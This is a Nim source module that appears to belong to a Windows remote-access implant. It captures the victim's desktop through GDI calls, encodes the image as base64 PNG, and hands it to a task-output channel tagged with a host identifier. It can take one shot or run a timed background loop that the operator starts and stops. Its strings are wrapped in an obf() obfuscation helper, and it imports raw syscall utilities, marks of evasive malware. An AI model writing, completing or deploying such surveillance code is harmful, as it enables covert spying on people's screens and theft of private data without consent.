from std/base64 import encode
import std/json
from std/locks import Lock, initLock, acquire, release
from std/random import rand
from std/strutils import parseInt, strip, toLowerAscii
import ../utils/global
import ../utils/tasks/buffer
import ../utils/general/encoding
import execution/core
import ../utils/winapi/handlers
import ../utils/winapi/utils
import ../utils/winapi/syscall

var
  mtx: Lock
  mtxOk = false
  alive = false
  parked = true
  th: pointer = nil
  shotOutParams = obf("{}")

proc lockOn() =
  # Initializes the screen shot lock once
  if not mtxOk:
    initLock(mtx)
    mtxOk = true

proc delayMs(params: string): culong =
  # Reads the loop delay from params
  result = 2000
  if params.len == 0: return
  try:
    let p = parseJson(params)
    if not p.hasKey(obf("delay")): return
    let d = p[obf("delay")]
    if d.kind == JsonNodeKind.JInt:
      let sec = d.getInt()
      if sec > 0: result = culong(sec * 1000)
    elif d.kind == JsonNodeKind.JString:
      let sec = parseInt(d.getStr())
      if sec > 0: result = culong(sec * 1000)
  except JsonParsingError:
    discard
  except ValueError:
    discard

proc wantsLoop(params: string): bool =
  # Checks that the params ask for a capture loop
  if params.len == 0: return false
  try:
    let p = parseJson(params)
    if not p.hasKey(obf("loop")): return false
    let v = p[obf("loop")]
    if v.kind == JsonNodeKind.JBool: return v.getBool()
    if v.kind == JsonNodeKind.JInt: return v.getInt() != 0
    let s = v.getStr().strip().toLowerAscii()
    s in [obf("true"), obf("1"), obf("loop"), obf("start")]
  except JsonParsingError:
    false

proc grab(): string =
  # Captures the desktop and returns a base 64 image
  let hdc = getDC(nil)
  if hdc == nil: return ""
  defer: discard releaseDC(nil, hdc)

  var w = getDeviceCaps(hdc, horzres)
  var h = getDeviceCaps(hdc, vertres)
  if w <= 0 or h <= 0:
    w = getDeviceCaps(hdc, desktopHorzres)
    h = getDeviceCaps(hdc, desktopVertres)
  if w <= 0 or h <= 0: return ""

  let memdc = createCompatibleDC(hdc)
  if memdc == nil: return ""
  defer: discard deleteDC(memdc)

  var bmi: BitmapInfo
  zeroMem(addr bmi, sizeof(bmi))
  bmi.bmiHeader.biSize = culong sizeof(BitmapInfoHeader)
  bmi.bmiHeader.biWidth = culong w
  bmi.bmiHeader.biHeight = culong(-h)
  bmi.bmiHeader.biPlanes = 1
  bmi.bmiHeader.biBitCount = 32
  bmi.bmiHeader.biCompression = biRgb
  let row = ((w * 32 + 31) div 32) * 4
  bmi.bmiHeader.biSizeImage = culong(row * h)

  var bits: pointer
  let bmp = createDIBSection(nil, addr bmi, dibRgbColors, addr bits, nil, 0)
  if bmp == nil or bits == nil: return ""
  let prev = selectObject(memdc, bmp)
  defer:
    discard selectObject(memdc, prev)
    discard deleteObject(bmp)

  if bitBlt(memdc, 0, 0, w, h, hdc, 0, 0, srccopy) == 0: return ""

  let pxLen = row * h
  let png = encodePngRgb(
    toOpenArray(cast[ptr UncheckedArray[byte]](bits), 0, pxLen - 1),
    int(w), int(h), row)
  result = encode(png)

proc send(b64: string) =
  # Sends the screen shot payload as task output
  if b64.len == 0: return
  let payload = $(%*{
    obf("option"): obf("output"),
    obf("type"): obf("screenshot"),
    obf("task_tag"): $rand(100_000_000 .. 999_999_999),
    obf("host_tag"): hostTag,
    obf("content"): b64,
  })
  discard apply_task_output(payload, shotOutParams)

proc workerMain(p: pointer) {.stdcall.} =
  # Worker that captures screen shots on a loop
  let heap = cast[ptr string](p)
  let params = heap[]
  dealloc(heap)
  shotOutParams = params
  let wait = delayMs(params)

  while true:
    lockOn()
    acquire(mtx)
    if not alive:
      parked = true
      release(mtx)
      sleepMs(50)
      continue
    parked = false
    release(mtx)

    send(grab())
    sleepMs(wait)

proc stop*() =
  # Stops the screen shot loop and waits until parked
  lockOn()
  acquire(mtx)
  alive = false
  release(mtx)
  if th == nil: return
  for _ in 0 ..< 500:
    lockOn()
    acquire(mtx)
    let p = parked
    release(mtx)
    if p: break
    sleepMs(10)

proc startLoop(params: string; buf: var openArray[char]): int =
  # Starts the screen shot loop thread
  lockOn()
  acquire(mtx)
  if th != nil and alive:
    release(mtx)
    return writeErr(obf("screenshot already running"), buf)
  let needThread = th == nil
  alive = true
  parked = false
  release(mtx)

  if needThread:
    let heap = cast[ptr string](alloc0(sizeof(string)))
    heap[] = params
    inc bgWorkers
    let h = createThread(cast[pointer](workerMain), heap)
    if h == nil:
      dec bgWorkers
      dealloc(heap)
      lockOn()
      acquire(mtx)
      alive = false
      release(mtx)
      return writeErr(obf("screenshot start failed"), buf)
    lockOn()
    acquire(mtx)
    th = h
    release(mtx)

  writeMsg(obf("Screenshot loop started."), buf)

proc run_screenshot*(params: string; buf: var openArray[char]): int =
  # Captures one screen shot or starts the loop
  if wantsLoop(params): return startLoop(params, buf)
  shotOutParams = params
  send(grab())
  writeMsg(obf("Screenshot captured."), buf)

proc run_screenshot_start*(params: string; buf: var openArray[char]): int =
  # Starts the screen shot loop
  startLoop(params, buf)

proc run_screenshot_stop*(_: string; buf: var openArray[char]): int =
  # Stops the screen shot loop and writes the status
  stop()
  writeMsg(obf("Screenshot loop stopped."), buf)
